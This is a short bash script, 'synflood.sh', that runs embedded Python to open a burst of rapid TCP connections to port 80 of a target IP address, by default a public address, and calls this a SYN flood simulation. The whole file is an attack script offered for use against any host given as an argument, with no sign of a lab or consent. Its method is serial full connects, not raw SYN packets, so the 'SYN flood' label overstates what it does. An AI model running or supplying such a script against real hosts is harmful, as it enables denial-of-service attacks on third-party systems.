#!/usr/bin/env bash
# synflood.sh — TCP SYN flood simulation via rapid serial connects
set -euo pipefail

TARGET="${1:-93.184.216.34}"
COUNT="${2:-200}"

echo "[*] SYN flood simulation → $TARGET ($COUNT connections)"

python3 - <<PYEOF
import socket, sys

target = "$TARGET"
count = $COUNT
sent = 0
for _ in range(count):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.05)
        s.connect((target, 80))
        s.close()
    except:
        pass
    sent += 1

print(f"[*] Sent {sent} SYN attempts")
PYEOF

echo "[*] SYN flood complete"
